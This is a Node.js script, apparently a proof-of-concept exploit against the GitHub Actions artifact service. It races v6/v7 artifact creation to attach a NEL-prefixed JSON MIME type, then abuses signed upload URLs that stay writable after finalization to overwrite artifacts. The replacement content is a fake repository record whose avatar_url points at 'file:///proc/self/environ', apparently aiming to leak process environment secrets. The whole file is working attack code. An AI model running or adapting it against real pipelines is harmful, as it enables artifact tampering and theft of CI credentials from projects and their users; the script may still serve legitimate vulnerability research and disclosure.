import {createHash} from 'node:crypto';
import {BlobClient} from '@azure/storage-blob';
import {internalArtifactTwirpClient} from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids = getBackendIdsFromToken();
const client = internalArtifactTwirpClient();
const nelJson = '\u0085application/json';
const repo = process.env.GITHUB_REPOSITORY;

function payload(artifactId) {
  return Buffer.from(JSON.stringify({
    full_name: `${repo}/actions/artifacts/${artifactId}/zip`,
    owner: {
      login: 'cassette',
      avatar_url: 'file:///proc/self/environ',
    },
    description: 'Repo Cassette artifact',
    stargazers_count: 0,
  }));
}

async function createArtifact(name, version, mimeType) {
  const response = await client.CreateArtifact({
    workflowRunBackendId: ids.workflowRunBackendId,
    workflowJobRunBackendId: ids.workflowJobRunBackendId,
    name,
    version,
    mimeType: StringValue.create({value: mimeType}),
  });
  if (!response.ok) throw new Error('CreateArtifact returned ok=false');
  return response;
}

async function upload(signedUrl, bytes) {
  await new BlobClient(signedUrl).getBlockBlobClient().uploadData(bytes, {
    blobHTTPHeaders: {blobContentType: nelJson},
  });
}

async function finalize(name, bytes) {
  const digest = createHash('sha256').update(bytes).digest('hex');
  const response = await client.FinalizeArtifact({
    workflowRunBackendId: ids.workflowRunBackendId,
    workflowJobRunBackendId: ids.workflowJobRunBackendId,
    name,
    size: String(bytes.length),
    hash: StringValue.create({value: `sha256:${digest}`}),
  });
  if (!response.ok) throw new Error('FinalizeArtifact returned ok=false');
  return String(response.artifactId);
}

async function race(index) {
  const name = `repo-cassette-${index}-${Date.now()}`;
  const specs = index % 2
    ? [[7, 'application/json'], [6, nelJson]]
    : [[6, nelJson], [7, 'application/json']];

  // A shared-name v6/v7 creation race can leave v6 MIME metadata attached to
  // the v7 raw-delivery artifact. Both orderings are tried repeatedly.
  const created = await Promise.all(
    specs.map(([version, mime]) => createArtifact(name, version, mime)),
  );
  const placeholder = Buffer.from('{"probe":"placeholder"}');
  await Promise.all(created.map(item => upload(item.signedUploadUrl, placeholder)));

  const finalized = await Promise.allSettled([
    finalize(name, placeholder),
    finalize(name, placeholder),
  ]);
  const artifactIds = [...new Set(finalized
    .filter(item => item.status === 'fulfilled')
    .map(item => item.value))];
  if (!artifactIds.length) throw new Error('both FinalizeArtifact calls failed');

  // The signed upload URLs remain writable after finalization.
  for (const artifactId of artifactIds) {
    const bytes = payload(artifactId);
    await Promise.all(created.map(item => upload(item.signedUploadUrl, bytes)));
  }

  const artifactId = artifactIds.at(-1);
  return {
    name,
    artifactId,
    artifactIds,
    repository: `${repo}/actions/artifacts/${artifactId}/zip`,
  };
}

const results = [];
for (let index = 0; index < 64; index += 1) {
  try {
    const result = await race(index);
    results.push(result);
    console.log(`BUILT ${JSON.stringify(result)}`);
  } catch (error) {
    console.log(`SKIPPED ${index}: ${error.message}`);
  }
}

if (!results.length) throw new Error('no race artifact was created');
console.log(`MANIFEST ${JSON.stringify(results)}`);
